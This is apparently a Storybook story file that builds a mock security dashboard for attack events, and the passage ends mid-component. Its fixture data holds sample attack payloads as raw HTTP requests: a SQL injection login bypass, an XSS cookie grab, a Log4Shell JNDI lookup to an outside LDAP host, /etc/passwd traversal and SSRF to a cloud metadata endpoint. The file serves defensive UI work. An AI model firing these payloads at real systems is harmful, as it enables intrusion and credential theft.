import { type MouseEvent, useState } from 'react';
import type { Meta, StoryFn } from 'storybook-react-rsbuild';
import { fn } from 'storybook/test';
import { Attribute, AttributeLabel, AttributeValue } from '../../components/Attribute';
import { Badge, type BadgeColor } from '../../components/Badge';
import { Button } from '../../components/Button';
import {
  CodeSnippetCode,
  CodeSnippetContent,
  CodeSnippetLineNumbers,
  CodeSnippetRoot,
  InlineCodeSnippet,
  type LineConfig,
} from '../../components/CodeSnippet';
import type { CountryCode } from '../../components/Country';
import {
  Drawer,
  DrawerBody,
  DrawerContent,
  DrawerHeader,
  DrawerResizeHandle,
} from '../../components/Drawer';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuItemText,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from '../../components/DropdownMenu';
import {
  EmptyState,
  EmptyStateActions,
  EmptyStateDescription,
  EmptyStateIllustration,
  EmptyStateMessage,
  EmptyStateTitle,
} from '../../components/EmptyState';
import { type ExprNode, type FieldMetadata, FilterInput } from '../../components/FilterInput';
import { FormatDateTime } from '../../components/FormatDateTime';
import { Heading } from '../../components/Heading';
import { HttpMethod } from '../../components/HttpMethod';
import { Ip, IpAddress, IpCountry, IpProvider } from '../../components/Ip';
import {
  Page,
  PageActions,
  PageContent,
  PageDescription,
  PageHeader,
  PageHeaderGroup,
  PageTitle,
  PageToolbar,
} from '../../components/Page';
import {
  Pagination,
  PaginationList,
  PaginationNext,
  PaginationPageSize,
  PaginationPrevious,
  useClientPagination,
} from '../../components/Pagination';
import { ResponseCode } from '../../components/ResponseCode';
import {
  ScrollArea,
  ScrollAreaContent,
  ScrollAreaScrollbar,
  ScrollAreaViewport,
} from '../../components/ScrollArea';
import { Separator } from '../../components/Separator';
import {
  BarList,
  BarListBar,
  BarListItem,
  BarListLabel,
  BarListPercent,
  BarListValue,
  Chart,
  ChartHeader,
  ChartTitle,
  LegendDot,
  LineChart,
  LineChartBody,
  type LineChartDatum,
  LineChartGrid,
  LineChartLine,
  type LineChartSeries,
  LineChartTooltip,
  LineChartXAxis,
  LineChartYAxis,
  PieChart,
  PieChartCenter,
  PieChartCenterLabel,
  PieChartCenterValue,
  PieChartDonut,
  PieChartLegend,
  PieChartLegendItem,
  PieChartLegendPercent,
  PieChartLegendValue,
  useChartTimeFormatters,
} from '../../components/SimpleCharts';
import { HStack, VStack } from '../../components/Stack';
import type {
  TableCellContext,
  TableColumnDef,
  TableRow,
  TableRowSelectionState,
  TableSortingState,
} from '../../components/Table';
import { Table, TableActionBar, TableEmptyState } from '../../components/Table';
import { Tabs, TabsList, TabsTrigger } from '../../components/Tabs';
import { Tag } from '../../components/Tag';
import { Text } from '../../components/Text';
import { Tooltip, TooltipContent, TooltipTrigger } from '../../components/Tooltip';
import {
  ArrowDown,
  CloudOff,
  Download,
  Ellipsis,
  FilterX,
  Link,
  RefreshCcw,
  SearchX,
  ShieldBan,
  ShieldCheck,
} from '../../icons';

type AttackType = 'sqli' | 'xss' | 'rce' | 'ptrav' | 'ssrf' | 'bola' | 'brute' | 'scanner';
type Severity = 'critical' | 'high' | 'medium' | 'low';
type AttackStatus = 'blocked' | 'monitored' | 'false-positive';

interface AttackEvent {
  id: string;
  attackType: AttackType;
  severity: Severity;
  status: AttackStatus;
  method: string;
  host: string;
  path: string;
  application: string;
  point: string;
  payload: string;
  ip: string;
  country: CountryCode;
  provider: string | null;
  code: number;
  hits: number;
  detectedAt: string;
  node: string;
  request: string;
  /** A second source joins attacks with three or more hits. */
  secondary: Source | null;
}

type AttackSeed = Pick<
  AttackEvent,
  | 'attackType'
  | 'severity'
  | 'method'
  | 'host'
  | 'path'
  | 'application'
  | 'point'
  | 'payload'
  | 'code'
  | 'request'
>;

interface Source {
  ip: string;
  country: CountryCode;
  provider: string | null;
}

const ATTACK_TYPES: Record<AttackType, string> = {
  sqli: 'SQL injection',
  xss: 'Cross-site scripting',
  rce: 'Remote code execution',
  ptrav: 'Path traversal',
  ssrf: 'SSRF',
  bola: 'BOLA',
  brute: 'Brute force',
  scanner: 'Scanner',
};

const SEVERITY: Record<Severity, { label: string; color: BadgeColor; rank: number }> = {
  critical: { label: 'Critical', color: 'red', rank: 4 },
  high: { label: 'High', color: 'w-orange', rank: 3 },
  medium: { label: 'Medium', color: 'yellow', rank: 2 },
  low: { label: 'Low', color: 'slate', rank: 1 },
};

const STATUS: Record<AttackStatus, { label: string; color: BadgeColor }> = {
  blocked: { label: 'Blocked', color: 'green' },
  monitored: { label: 'Monitored', color: 'yellow' },
  'false-positive': { label: 'False positive', color: 'gray' },
};

const SEEDS: AttackSeed[] = [
  {
    attackType: 'sqli',
    severity: 'critical',
    method: 'POST',
    host: 'api.shop-demo.io',
    path: '/api/v2/auth/login',
    application: 'Checkout API',
    point: 'post.json.username',
    payload: "admin' OR '1'='1' --",
    code: 403,
    request: `POST /api/v2/auth/login HTTP/1.1
Host: api.shop-demo.io
User-Agent: sqlmap/1.8.4#stable (https://sqlmap.org)
Content-Type: application/json
Accept: */*
Content-Length: 58

{"username":"admin' OR '1'='1' --","password":"hunter2"}`,
  },
  {
    attackType: 'xss',
    severity: 'high',
    method: 'GET',
    host: 'shop-demo.io',
    path: '/search',
    application: 'Storefront',
    point: 'get.q',
    payload: '<script>alert(document.cookie)</script>',
    code: 200,
    request: `GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: shop-demo.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml
Referer: https://shop-demo.io/
Cookie: session=7f3c9a12e4b8`,
  },
  {
    attackType: 'rce',
    severity: 'critical',
    method: 'GET',
    host: 'api.shop-demo.io',
    path: '/api/v1/health',
    application: 'Checkout API',
    point: 'header.X-Api-Version',
    payload: '${jndi:ldap://198.51.100.23:1389/Exploit}',
    code: 403,
    request: `GET /api/v1/health HTTP/1.1
Host: api.shop-demo.io
User-Agent: curl/8.7.1
X-Api-Version: \${jndi:ldap://198.51.100.23:1389/Exploit}
Accept: */*`,
  },
  {
    attackType: 'ptrav',
    severity: 'high',
    method: 'GET',
    host: 'cdn.shop-demo.io',
    path: '/static/../../../../etc/passwd',
    application: 'Storefront',
    point: 'uri.path',
    payload: '../../../../etc/passwd',
    code: 403,
    request: `GET /static/../../../../etc/passwd HTTP/1.1
Host: cdn.shop-demo.io
User-Agent: python-requests/2.32.3
Accept: */*
Connection: keep-alive`,
  },
  {
    attackType: 'ssrf',
    severity: 'high',
    method: 'POST',
    host: 'api.shop-demo.io',
    path: '/api/v2/webhooks/test',
    application: 'Partner API',
    point: 'post.json.url',
    payload: 'http://169.254.169.254/latest/meta-data/iam/',
    code: 500,
    request: `POST /api/v2/webhooks/test HTTP/1.1
Host: api.shop-demo.io
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.partner-7781
Content-Type: application/json
Content-Length: 61

{"url":"http://169.254.169.254/latest/meta-data/iam/"}`,
  },
  {
    attackType: 'bola',
    severity: 'medium',
    method: 'GET',
    host: 'api.shop-demo.io',
    path: '/api/v2/orders/100482',
    application: 'Checkout API',
    point: 'uri.path.order_id',
    payload: '100482',
    code: 200,
    request: `GET /api/v2/orders/100482 HTTP/1.1
Host: api.shop-demo.io
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.customer-2214
Accept: application/json
User-Agent: ShopDemo-iOS/5.12.0`,
  },
  {
    attackType: 'brute',
    severity: 'medium',
    method: 'POST',
    host: 'auth.shop-demo.io',
    path: '/oauth/token',
    application: 'Identity',
    point: 'post.form.password',
    payload: 'password=Summer2026!',
    code: 429,
    request: `POST /oauth/token HTTP/1.1
Host: auth.shop-demo.io
Content-Type: application/x-www-form-urlencoded
User-Agent: Hydra/9.5
Content-Length: 64

grant_type=password&username=j.doe&password=Summer2026!`,
  },
  {
    attackType: 'scanner',
    severity: 'low',
    method: 'GET',
    host: 'shop-demo.io',
    path: '/.git/config',
    application: 'Storefront',
    point: 'uri.path',
    payload: '/.git/config',
    code: 404,
    request: `GET /.git/config HTTP/1.1
Host: shop-demo.io
User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
Accept: */*`,
  },
];

const SOURCES: Source[] = [
  { ip: '203.0.113.24', country: 'NL', provider: 'Digital Ocean' },
  { ip: '198.51.100.73', country: 'US', provider: 'AWS' },
  { ip: '203.0.113.141', country: 'DE', provider: 'Hetzner' },
  { ip: '198.51.100.9', country: 'BR', provider: null },
  { ip: '203.0.113.88', country: 'SG', provider: 'Tor' },
  { ip: '198.51.100.212', country: 'RO', provider: 'OVHcloud' },
  { ip: '203.0.113.5', country: 'VN', provider: null },
  { ip: '198.51.100.160', country: 'IN', provider: 'GCP' },
  { ip: '203.0.113.199', country: 'FR', provider: 'VPN' },
];

const NODES = ['node-eu-central-1', 'node-us-east-2', 'node-ap-south-1'];

// 46 deterministic events, newest first: 5 Nov 2026 14:52 UTC, then every ~11 minutes.
const EVENTS: AttackEvent[] = Array.from({ length: 46 }, (_, index) => {
  const seed = SEEDS[(index * 5) % SEEDS.length] as AttackSeed;
  const source = SOURCES[(index * 7) % SOURCES.length] as Source;
  const node = NODES[index % NODES.length] as string;
  const blocked = seed.code === 403 || seed.code === 429;
  const hits = ((index * 137) % 380) + 1;
  return {
    ...seed,
    ...source,
    id: `evt-${48213 - index}`,
    status: blocked ? 'blocked' : 'monitored',
    hits,
    detectedAt: new Date(Date.UTC(2026, 10, 5, 14, 52) - index * 11 * 60_000).toISOString(),
    node,
    secondary: hits >= 3 ? (SOURCES[(index * 7 + 4) % SOURCES.length] as Source) : null,
  };
});

const FILTER_FIELDS: FieldMetadata[] = [
  {
    name: 'attack_type',
    label: 'Attack type',
    type: 'enum',
    operators: ['=', '!=', 'in', 'not_in'],
    values: Object.entries(ATTACK_TYPES).map(([value, label]) => ({ value, label })),
  },
  {
    name: 'severity',
    label: 'Severity',
    type: 'enum',
    operators: ['=', '!=', 'in', 'not_in'],
    values: Object.entries(SEVERITY).map(([value, { label, color }]) => ({
      value,
      label,
      badge: { color, text: label },
    })),
  },
  {
    name: 'status',
    label: 'Status',
    type: 'enum',
    operators: ['=', '!=', 'in'],
    values: Object.entries(STATUS).map(([value, { label, color }]) => ({
      value,
      label,
      badge: { color, text: label },
    })),
  },
  {
    name: 'source_ip',
    label: 'Source IP',
    type: 'string',
    description: 'IPv4 or IPv6 address the request came from',
    example: '203.0.113.24',
    operators: ['=', '!=', 'in', 'like'],
    options: [],
  },
  {
    name: 'host',
    label: 'Host',
    type: 'string',
    operators: ['=', '!=', 'in', 'like'],
    options: ['shop-demo.io', 'api.shop-demo.io', 'auth.shop-demo.io', 'cdn.shop-demo.io'],
    strictValues: false,
  },
  {
    name: 'method',
    label: 'HTTP method',
    type: 'string',
    operators: ['=', '!=', 'in'],
    options: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  },
  { name: 'status_code', label: 'Response code', type: 'integer' },
  {
    name: 'detected_at',
    label: 'Date',
    type: 'date',
    operators: ['>', '>=', '<', '<=', 'between'],
  },
];

const FILTER_VALUES: Record<string, (event: AttackEvent) => string | number> = {
  attack_type: event => event.attackType,
  severity: event => event.severity,
  status: event => event.status,
  source_ip: event => event.ip,
  host: event => event.host,
  method: event => event.method,
  status_code: event => event.code,
};

// Client-side stand-in for the server query the expression would become.
// ponytail: date conditions always match; a real app sends the expression to its API.
const matchesFilter = (event: AttackEvent, node: ExprNode | null): boolean => {
  if (!node) return true;
  if (node.type === 'group') {
    return node.operator === 'and'
      ? node.children.every(child => matchesFilter(event, child))
      : node.children.some(child => matchesFilter(event, child));
  }
  const read = FILTER_VALUES[node.field];
  if (!read || !node.operator) return true;
  const actual = String(read(event)).toLowerCase();
  const expected = (Array.isArray(node.value) ? node.value : [node.value]).map(value =>
    String(value).toLowerCase(),
  );
  // Status code masks: "4XX" matches every 4xx code.
  const equals = expected.some(value =>
    value.includes('x') ? actual.startsWith(value.replace(/x/g, '')) : actual === value,
  );
  const contains = expected.some(value => actual.includes(value));
  switch (node.operator) {
    case '=':
    case 'in':
      return equals;
    case '!=':
    case 'not_in':
      return !equals;
    case 'like':
      return contains;
    case 'not_like':
      return !contains;
    default:
      return true;
  }
};

// Sorting runs before paging, so every page is a slice of one sorted list (`manualSorting`).
const sortEvents = (events: AttackEvent[], sorting: TableSortingState) => {
  const [rule] = sorting;
  if (!rule) return events;
  const sortValue = (event: AttackEvent) =>
    rule.id === 'severity'
      ? SEVERITY[event.severity].rank
      : (event[rule.id as keyof AttackEvent] ?? '');
  const sorted = [...events].sort((a, b) => (sortValue(a) > sortValue(b) ? 1 : -1));
  return rule.desc ? sorted.reverse() : sorted;
};

// The attack point gets a red line and its payload a bold range in the raw request.
const getPayloadLines = (code: string, payload: string): Record<number, LineConfig> => {
  const lines = code.split('\n');
  const index = lines.findIndex(line => line.includes(payload));
  if (index === -1) return {};
  const start = (lines[index] as string).indexOf(payload);
  return { [index + 1]: { color: 'danger', ranges: [{ start, end: start + payload.length }] } };
};

interface AttackRequest {
  id: string;
  time: string;
  code: number;
  source: Source;
}

interface Share {
  name: string;
  value: number;
}

// The latest requests of one attack; the app pages the rest.
const getRequests = (event: AttackEvent): AttackRequest[] =>
  Array.from({ length: Math.min(event.hits, 6) }, (_, index) => ({
    id: `${event.id}-r${index + 1}`,
    time: new Date(new Date(event.detectedAt).getTime() - index * 47_000).toISOString(),
    code: event.code,
    source: (index % 3 === 2 && event.secondary) || event,
  }));

const getSources = (event: AttackEvent): Source[] =>
  event.secondary ? [event, event.secondary] : [event];

const getIpShares = (event: AttackEvent): Share[] => {
  const second = event.secondary ? Math.floor(event.hits / 3) : 0;
  return getSources(event).map((source, index) => ({
    name: source.ip,
    value: index === 0 ? event.hits - second : second,
  }));
};

const STATUS_CODE_COLOR = { '2XX': 'green', '4XX': 'amber', '5XX': 'red' } as const;
type StatusCodeClass = keyof typeof STATUS_CODE_COLOR;

const getStatusCodes = (event: AttackEvent) => {
  const main = `${String(event.code)[0]}XX` as StatusCodeClass;
  const other: StatusCodeClass = main === '4XX' ? '5XX' : '4XX';
  const rest = Math.floor(event.hits / 4);
  return [
    { name: main, value: event.hits - rest, color: STATUS_CODE_COLOR[main] },
    { name: other, value: rest, color: STATUS_CODE_COLOR[other] },
  ].filter(row => row.value > 0);
};

// Hits per 5 minutes over the hour before the last one; the buckets add up to about `hits`.
const getTimeline = (event: AttackEvent): LineChartDatum[] => {
  const end = new Date(event.detectedAt).getTime();
  return Array.from({ length: 13 }, (_, index) => ({
    timestamp: end - (12 - index) * 5 * 60_000,
    hits: Math.round((event.hits / 19) * ((index * 7) % 5) * (index > 4 ? 1 : 0.3)),
  }));
};
const TIMELINE_SERIES: LineChartSeries[] = [{ key: 'hits', label: 'Hits', color: 'brand' }];

const getFirstSeen = (event: AttackEvent) =>
  new Date(new Date(event.detectedAt).getTime() - 60 * 60_000).toISOString();

const sumValues = (rows: Share[]) => rows.reduce((sum, row) => sum + row.value, 0);
const formatCount = (value: number) => value.toLocaleString('en-US');

const onExportEvents = fn().mockName('onExportEvents');
const onBlockSources = fn().mockName('onBlockSources');
const onCopyLink = fn().mockName('onCopyLink');
const onSaveDrawerWidth = fn().mockName('onSaveDrawerWidth');

const getEventId = (event: AttackEvent) => event.id;

const SEVERITY_FILTER: ExprNode = {
  type: 'condition',
  field: 'severity',
  operator: 'in',
  value: ['critical', 'high', 'medium'],
};

const renderAttack = ({ row }: TableCellContext<AttackEvent, unknown>) => (
  <VStack gap={2}>
    <Text size='sm' weight='medium' truncate>
      {ATTACK_TYPES[row.original.attackType]}
    </Text>
    <Text size='xs' color='secondary'>
      {row.original.id}
    </Text>
  </VStack>
);
const renderSeverity = ({ row }: TableCellContext<AttackEvent, unknown>) => (
  <Badge type='secondary' color={SEVERITY[row.original.severity].color}>
    {SEVERITY[row.original.severity].label}
  </Badge>
);
const renderStatus = ({ row }: TableCellContext<AttackEvent, unknown>) => (
  <Badge variant='dotted' type='secondary' color={STATUS[row.original.status].color}>
    {STATUS[row.original.status].label}
  </Badge>
);
const renderRequest = ({ row }: TableCellContext<AttackEvent, unknown>) => (
  <VStack gap={2}>
    <HStack gap={6} align='center'>
      <HttpMethod method={row.original.method} size='small' />
      <Text size='sm' truncate>
        {row.original.path}
      </Text>
    </HStack>
    <Text size='xs' color='secondary' truncate>
      {row.original.host}
    </Text>
  </VStack>
);
const renderSource = ({ row }: TableCellContext<AttackEvent, unknown>) => (
  <Ip>
    <IpCountry code={row.original.country} />
    <IpAddress>{row.original.ip}</IpAddress>
    {row.original.provider && <IpProvider>{row.original.provider}</IpProvider>}
  </Ip>
);
const renderCode = ({ row }: TableCellContext<AttackEvent, unknown>) => (
  <ResponseCode code={row.original.code} />
);
const renderDetectedAt = ({ row }: TableCellContext<AttackEvent, unknown>) => (
  <FormatDateTime value={row.original.detectedAt} format='datetime' />
);

interface AttackEventsArgs {
  initialFilter?: ExprNode | null;
  isLoading?: boolean;
  loadFailed?: boolean;
}

const meta = {
  title: 'Templates/Attack events',
  parameters: {
    layout: 'fullscreen',
    docs: {
      description: {
        component:
          'Use when building a security event log: a filterable, sortable, paged table of detected attacks with bulk triage and a wide event drawer down to the raw request.',
      },
    },
  },
} satisfies Meta;

export default meta;

/**
 * The whole screen: a query-builder filter over a dense, sortable, paged table of attacks.
 * Severity and status are badges; the request, source IP and response code use the HTTP and IP
 * primitives. Tick rows to triage them from the bulk bar; click an attack to open its event
 * drawer: a summary header, Overview with attributes and charts, Requests with the raw request.
 */
export const Default: StoryFn<AttackEventsArgs> = ({
  initialFilter = SEVERITY_FILTER,
  isLoading = false,
  loadFailed = false,
}) => {
  const [filter, setFilter] = useState<ExprNode | null>(initialFilter);
  const [sorting, setSorting] = useState<TableSortingState>([{ id: 'detectedAt', desc: true }]);
  const [rowSelection, setRowSelection] = useState<TableRowSelectionState>({});
  const [falsePositiveIds, setFalsePositiveIds] = useState<string[]>([]);
  const [failed, setFailed] = useState(loadFailed);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [open, setOpen] = useState(false);
  const [tab, setTab] = useState('overview');
  const [requestId, setRequestId] = useState<string | null>(null);
  const { formatHour, formatHourWithTimezone } = useChartTimeFormatters();

  const events = EVENTS.map(event =>
    falsePositiveIds.includes(event.id) ? { ...event, status: 'false-positive' as const } : event,
  );
  const rows =
    isLoading || failed
      ? []
      : sortEvents(
          events.filter(event => matchesFilter(event, filter)),
          sorting,
        );
  const { pageData, ...pagination } = useClientPagination(rows, 10);
  const selected = events.find(event => event.id === selectedId) ?? null;
  const requests = selected ? getRequests(selected) : [];
  const request = requests.find(item => item.id === requestId) ?? null;
  const selectedIds = Object.keys(rowSelection).filter(id => rowSelection[id]);

  const markFalsePositive = (ids: string[]) => setFalsePositiveIds([...falsePositiveIds, ...ids]);
  const openEvent = (id: string) => {
    setSelectedId(id);
    setTab('overview');
    setRequestId(null);
    setOpen(true);
  };

  const renderMenuAction = (row: TableRow<AttackEvent>) => {
    const event = row.original;
    const handleOpen = () => openEvent(event.id);
    const handleMarkFalsePositive = () => markFalsePositive([event.id]);
    const handleBlockSource = () => onBlockSources([event.ip]);

    return (
      <DropdownMenu>
        <DropdownMenuTrigger asChild>
          <Button
            variant='ghost'
            color='neutral'
            size='small'
            aria-label={`Actions for event ${event.id}`}
          >
            <Ellipsis />
          </Button>
        </DropdownMenuTrigger>
        <DropdownMenuContent>
          <DropdownMenuItem onSelect={handleOpen}>
            <DropdownMenuItemText>Open event</DropdownMenuItemText>
          </DropdownMenuItem>
          <DropdownMenuItem onSelect={handleMarkFalsePositive}>
            <DropdownMenuItemText>Mark as false positive</DropdownMenuItemText>
          </DropdownMenuItem>
          <DropdownMenuSeparator />
          <DropdownMenuItem variant='destructive' onSelect={handleBlockSource}>
            <DropdownMenuItemText>Add IP to denylist</DropdownMenuItemText>
          </DropdownMenuItem>
        </DropdownMenuContent>
      </DropdownMenu>
    );
  };

  const columns: TableColumnDef<AttackEvent>[] = [
    {
      accessorKey: 'attackType',
      header: 'Attack',
      size: 250,
      cell: renderAttack,
      meta: { renderMenuAction },
    },
    { accessorKey: 'severity', header: 'Severity', size: 100, cell: renderSeverity },
    { accessorKey: 'status', header: 'Status', size: 130, cell: renderStatus },
    { accessorKey: 'path', header: 'Request', size: 280, cell: renderRequest },
    { accessorKey: 'ip', header: 'Source IP', size: 250, cell: renderSource },
    { accessorKey: 'code', header: 'Code', size: 80, cell: renderCode },
    {
      accessorKey: 'hits',
      header: 'Hits',
      size: 80,
      meta: { description: { type: 'tooltip', content: 'Requests grouped into this attack' } },
    },
    { accessorKey: 'detectedAt', header: 'Detected', size: 140, cell: renderDetectedAt },
  ];

  const handleResetFilters = () => setFilter(null);
  const handleRetry = () => setFailed(false);
  const handleBulkFalsePositive = () => {
    markFalsePositive(selectedIds);
    setRowSelection({});
  };
  const handleBulkBlock = () =>
    onBlockSources(events.filter(event => rowSelection[event.id]).map(event => event.ip));
  const handleBulkExport = () => onExportEvents(selectedIds);
  const handleCopyLink = () => onCopyLink(selected?.id);
  const handleSelectRequest = (event: MouseEvent<HTMLButtonElement>) =>
    setRequestId(event.currentTarget.value);
  const handleRequestFalsePositive = () => selected && markFalsePositive([selected.id]);
  const handleRequestBlock = () => request && onBlockSources([request.source.ip]);

  const sources = selected ? getSources(selected) : [];
  const countries = new Set(sources.map(source => source.country)).size;
  const ipShares = selected ? getIpShares(selected) : [];
  const statusCodes = selected ? getStatusCodes(selected) : [];

  return (
    <Page name='attack-events' fullSize fixedHeight data-testid='attacks-page'>
      <PageHeader>
        <PageHeaderGroup className='flex-1'>
          <PageTitle>Attack events</PageTitle>
          <PageDescription>
            Malicious requests the filtering nodes detected across your applications, and how each
            was handled.
          </PageDescription>
        </PageHeaderGroup>
        <PageActions>
          <Button
            size='medium'
            variant='outline'
            color='neutral'
            onClick={onExportEvents}
            data-testid='attacks-export'
          >
            <Download />
            Export CSV
          </Button>
        </PageActions>
      </PageHeader>

      <PageToolbar>
        <FilterInput
          fields={FILTER_FIELDS}
          value={filter}
          onChange={setFilter}
          placeholder='Filter by attack type, severity, status, source IP, host or date'
          data-testid='attacks-filter'
        />
      </PageToolbar>

      <PageContent>
        <VStack gap={12}>
          <Table
            aria-label='Attack events'
            data={pageData}
            columns={columns}
            getRowId={getEventId}
            isLoading={isLoading}
            sorting={sorting}
            onSortingChange={setSorting}
            manualSorting
            rowSelection={rowSelection}
            onRowSelectionChange={setRowSelection}
            activeRowId={open ? selectedId : null}
            onMasterCellClick={openEvent}
            data-testid='attacks-table'
          >
            <TableActionBar>
              <Button
                variant='ghost'
                color='neutral-alt'
                onClick={handleBulkFalsePositive}
                data-testid='attacks-bulk-false-positive'
              >
                <ShieldCheck /> Mark as false positive
              </Button>
              <Button variant='ghost' color='neutral-alt' onClick={handleBulkBlock}>
                <ShieldBan /> Block source IPs
              </Button>
              <Button variant='ghost' color='neutral-alt' onClick={handleBulkExport}>
                <Download /> Export
              </Button>
            </TableActionBar>
            <TableEmptyState>
              {failed ? (
                <EmptyState data-testid='attacks-error'>
                  <EmptyStateIllustration>
                    <CloudOff />
                  </EmptyStateIllustration>
                  <EmptyStateMessage>
                    <EmptyStateTitle>Couldn't load attacks</EmptyStateTitle>
                    <EmptyStateDescription>
                      The server didn't respond. Detection keeps running; try again in a moment.
                    </EmptyStateDescription>
                  </EmptyStateMessage>
                  <EmptyStateActions>
                    <Button
                      size='medium'
                      variant='outline'
                      color='neutral'
                      onClick={handleRetry}
                      data-testid='attacks-retry'
                    >
                      <RefreshCcw />
                      Try again
                    </Button>
                  </EmptyStateActions>
                </EmptyState>
              ) : (
                <EmptyState type='collection-empty' data-testid='attacks-no-results'>
                  <EmptyStateIllustration>
                    <SearchX />
                  </EmptyStateIllustration>
                  <EmptyStateMessage>
                    <EmptyStateTitle>No results found</EmptyStateTitle>
                    <EmptyStateDescription>No attacks match the filter.</EmptyStateDescription>
                  </EmptyStateMessage>
                  <EmptyStateActions>
                    <Button
                      size='medium'
                      variant='outline'
                      color='neutral'
                      onClick={handleResetFilters}
                      data-testid='attacks-reset-filters'
                    >
                      <FilterX />
                      Reset filters
                    </Button>
                  </EmptyStateActions>
                </EmptyState>
              )}
            </TableEmptyState>
          </Table>
          {rows.length > 0 && (
            <Pagination
              {...pagination}
              align='right'
              aria-label='Attack events pages'
              data-testid='attacks-pagination'
            >
              <PaginationPageSize options={[10, 25, 50]} />
              <PaginationPrevious />
              <PaginationList />
              <PaginationNext />
            </Pagination>
          )}
        </VStack>
      </PageContent>

      <Drawer
        open={open}
        onOpenChange={setOpen}
        modal={false}
        overlay={false}
        closeOnOutsideClick={false}
        width={1064}
        data-testid='attack-drawer'
      >
        <DrawerContent>
          <DrawerResizeHandle onResizeEnd={onSaveDrawerWidth} />
          <DrawerHeader>
            <HStack align='start' justify='between' gap={16} fullWidth className='min-w-0'>
              <VStack gap={4} className='min-w-0' data-testid='attack-summary'>
                <Heading as='h2' size='xl' weight='medium' truncate>
                  {selected &&
                    `${ATTACK_TYPES[selected.attackType]} in ${selected.point} on ${selected.host}`}
                </Heading>
                {selected && (
                  <HStack gap={4} align='center'>
                    <Badge
                      variant='dotted'
                      type='secondary'
                      size='medium'
                      color={STATUS[selected.status].color}
                    >
                      {STATUS[selected.status].label}
                    </Badge>
                    <Text size='xs' color='secondary'>
                      ·
                    </Text>
                    <Text size='xs' color='secondary'>
                      {selected.status === 'blocked' ? selected.hits : 0}/{selected.hits} blocked
                    </Text>
                    <Text size='xs' color='secondary'>
                      ·
                    </Text>
                    <Text size='xs' color='secondary'>
                      {sources.length} {sources.length === 1 ? 'IP' : 'IPs'} across {countries}{' '}
                      {countries === 1 ? 'country' : 'countries'}
                    </Text>
                  </HStack>
                )}
              </VStack>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant='ghost'
                    color='neutral'
                    size='small'
                    aria-label='Copy link'
                    onClick={handleCopyLink}
                  >
                    <Link />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>Copy link</TooltipContent>
              </Tooltip>
            </HStack>
          </DrawerHeader>
          <Tabs value={tab} onChange={setTab} data-testid='attack-tabs'>
            <TabsList>
              <TabsTrigger value='overview'>Overview</TabsTrigger>
              <TabsTrigger value='requests'>
                Requests
                <Badge type='secondary' color='slate' size='medium' className='ml-4'>
                  {selected && formatCount(selected.hits)}
                </Badge>
              </TabsTrigger>
            </TabsList>
          </Tabs>

          {selected && tab === 'overview' && (
            <DrawerBody>
              <VStack gap={12} className='py-16' data-testid='attack-overview'>
                <div className='grid grid-cols-2 gap-x-8 gap-y-16 rounded-8 border border-border-primary-light p-16'>
                  <Attribute>
                    <AttributeLabel>Severity</AttributeLabel>
                    <AttributeValue>
                      <Badge
                        type='secondary'
                        size='medium'
                        color={SEVERITY[selected.severity].color}
                      >
                        {SEVERITY[selected.severity].label}
                      </Badge>
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>First seen</AttributeLabel>
                    <AttributeValue>
                      <FormatDateTime
                        value={getFirstSeen(selected)}
                        format='datetime'
                        layout='inline'
                      />
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Attack type</AttributeLabel>
                    <AttributeValue>
                      <Badge type='secondary' color='slate' size='medium'>
                        {ATTACK_TYPES[selected.attackType]}
                      </Badge>
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Last seen</AttributeLabel>
                    <AttributeValue>
                      <FormatDateTime
                        value={selected.detectedAt}
                        format='datetime'
                        layout='inline'
                      />
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Application</AttributeLabel>
                    <AttributeValue>
                      <Tag>{selected.application}</Tag>
                    </AttributeValue>
                  </Attribute>
                  <Attribute>
                    <AttributeLabel>Node</AttributeLabel>
                    <AttributeValue>
                      <InlineCodeSnippet code={selected.node} size='md' />
                    </AttributeValue>
                  </Attribute>
                  <Attribute className='col-span-2'>
                    <AttributeLabel>IPs</AttributeLabel>
                    <AttributeValue>
                      <HStack gap={8}>
                        {sources.map(source => (
                          <Ip key={source.ip}>
                            <IpCountry code={source.country} />
                            <IpAddress>{source.ip}</IpAddress>
                            {source.provider && <IpProvider>{source.provider}</IpProvider>}
                          </Ip>
                        ))}
                      </HStack>
                    </AttributeValue>
                  </Attribute>
                </div>
                <Chart>
                  <ChartHeader>
                    <ChartTitle>Timeline</ChartTitle>
                  </ChartHeader>
                  <LineChart data={getTimeline(selected)} series={TIMELINE_SERIES} xKey='timestamp'>
                    <LineChartBody>
                      <LineChartGrid />
                      <LineChartXAxis tickFormatter={formatHour} minTickGap={48} />
                      <LineChartYAxis />
                      <LineChartLine seriesKey='hits' curve='linear' />
                      <LineChartTooltip xTickFormatter={formatHourWithTimezone} />
                    </LineChartBody>
                  </LineChart>
                </Chart>
                <div className='grid grid-cols-2 gap-12'>
                  <Chart>
                    <ChartHeader>
                      <ChartTitle>Top 5 IPs</ChartTitle>
                    </ChartHeader>
                    <BarList max={sumValues(ipShares)}>
                      {ipShares.map(row => (
                        <BarListItem key={row.name} value={row.value}>
                          <BarListBar />
                          <BarListLabel>{row.name}</BarListLabel>
                          <BarListValue>
                            <BarListPercent />
                          </BarListValue>
                        </BarListItem>
                      ))}
                    </BarList>
                  </Chart>
                  <Chart>
                    <ChartHeader>
                      <ChartTitle>Status codes</ChartTitle>
                    </ChartHeader>
                    <PieChart data={statusCodes} total={sumValues(statusCodes)}>
                      <PieChartDonut>
                        <PieChartCenter>
                          <PieChartCenterValue>{formatCount(selected.hits)}</PieChartCenterValue>
                          <PieChartCenterLabel pluralize={{ one: 'hit', other: 'hits' }} />
                        </PieChartCenter>
